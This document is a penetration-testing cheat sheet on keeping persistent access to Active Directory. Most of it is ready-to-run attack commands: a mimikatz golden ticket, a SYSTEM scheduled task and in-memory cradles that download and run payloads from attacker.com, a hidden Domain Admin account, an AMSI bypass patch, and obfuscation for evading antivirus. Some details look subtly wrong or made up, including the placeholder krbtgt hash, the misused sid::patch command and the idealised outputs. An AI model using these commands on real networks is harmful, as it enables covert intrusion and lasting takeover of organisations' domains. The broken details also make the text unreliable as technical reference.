# Persistence in Active Directory Penetration Testing

## Overview
Persistence involves establishing mechanisms to maintain access to the AD environment even if credentials are reset or vulnerabilities are patched.

## Detailed Methods and Techniques
- **Golden Ticket**:
  - **Technique**: Create a forged Kerberos TGT for persistent access.
  - **Execution**: Use `mimikatz` to generate a golden ticket.
    ```bash
    mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890-0987654321-123456789 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt
    ```
    **Example Output**:
    ```
    [*] Golden ticket injected into session
    ```
    - **Purpose**: Maintain Domain Admin access without valid credentials.
- **Scheduled Tasks**:
  - **Technique**: Create a scheduled task to execute a malicious payload.
  - **Execution**: Use `schtasks`.
    ```bash
    schtasks /create /tn Backdoor /tr "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))" /sc daily /ru SYSTEM
    ```
    **Example Output**:
    ```
    SUCCESS: The scheduled task "Backdoor" has successfully been created.
    ```
    - **Purpose**: Ensure persistent code execution as SYSTEM.
- **Backdoored Accounts**:
  - **Technique**: Create a hidden AD account with administrative privileges.
  - **Execution**: Use PowerShell.
    ```powershell
    New-ADUser -Name backdoor -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) -Enabled $true
    Add-ADGroupMember -Identity "Domain Admins" -Members backdoor
    ```
    **Example Output**:
    ```
    User backdoor created and added to Domain Admins
    ```
    - **Purpose**: Maintain a secret admin account.
- **SID History Injection**:
  - **Technique**: Inject a privileged SID into an account’s SID history.
  - **Execution**: Use `mimikatz`.
    ```bash
    mimikatz # sid::patch /sid:S-1-5-21-1234567890-0987654321-512
    ```
    **Example Output**:
    ```
    [*] SID history modified for user
    ```
    - **Purpose**: Grant Domain Admin privileges to a low-privilege account.
- **Service Creation**:
  - **Technique**: Create a malicious service for persistent execution.
  - **Execution**: Use `sc`.
    ```bash
    sc \\192.168.1.20 create Backdoor binPath= "C:\Windows\Temp\backdoor.exe" start= auto
    ```
    **Example Output**:
    ```
    [SC] CreateService SUCCESS
    ```
    - **Purpose**: Run a malicious binary on system startup.

## Exploitation Methods
- **Golden Ticket**:
  - **Technique**: Use the forged TGT to access any domain resource repeatedly.
  - **Execution**: Inject the ticket with `mimikatz` (as shown above).
    - **Purpose**: Persistent access despite password changes.
- **Backdoor Account Exploitation**:
  - **Technique**: Use the backdoor account to authenticate to AD services.
  - **Execution**: Use `xfreerdp` with backdoor credentials.
    ```bash
    xfreerdp /u:backdoor /p:P@ssw0rd123 /v:192.168.1.10
    ```
    **Example Output**: RDP session opens as backdoor user.
    - **Purpose**: Maintain persistent administrative access.

## AV/AMSI Evasion Techniques
- **Obfuscated Payloads**:
  - **Technique**: Obfuscate persistence scripts to evade AMSI.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {New-ADUser -Name backdoor -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) -Enabled $true} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI detection during account creation.
- **In-Memory Execution**:
  - **Technique**: Execute persistence scripts in memory.
  - **Execution**: Use `Invoke-Expression`.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/backdoor.ps1')
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**:
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell script scanning.
- **Encrypted Communication**:
  - **Technique**: Use HTTPS for remote script delivery.
  - **Execution**: Host scripts on an HTTPS server.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/backdoor.ps1')
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.

## Tools
- **Mimikatz**: Golden ticket and SID history attacks (`kerberos::golden`, `sid::patch`).
- **PowerShell**: Account creation and task scheduling (`New-ADUser`, `schtasks`).
- **BloodHound**: Identify persistence opportunities via AD relationships.
- **sc**: Service creation.

## Best Practices
- Ensure persistence mechanisms are authorized for testing.
- Document all persistence methods for remediation recommendations.
- Remove backdoors after testing to avoid unintended access.
- Use obfuscation and encryption to evade AV/AMSI.